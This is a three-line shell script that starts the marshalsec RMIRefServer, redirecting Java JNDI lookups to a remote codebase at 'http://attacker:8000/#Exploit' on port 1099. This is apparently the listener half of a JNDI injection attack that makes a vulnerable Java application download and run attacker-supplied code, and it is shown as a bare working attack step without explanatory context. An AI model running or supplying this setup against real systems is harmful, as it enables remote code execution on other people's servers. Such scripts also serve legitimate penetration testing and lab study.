#!/bin/sh
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer \
	"http://attacker:8000/#Exploit" 1099
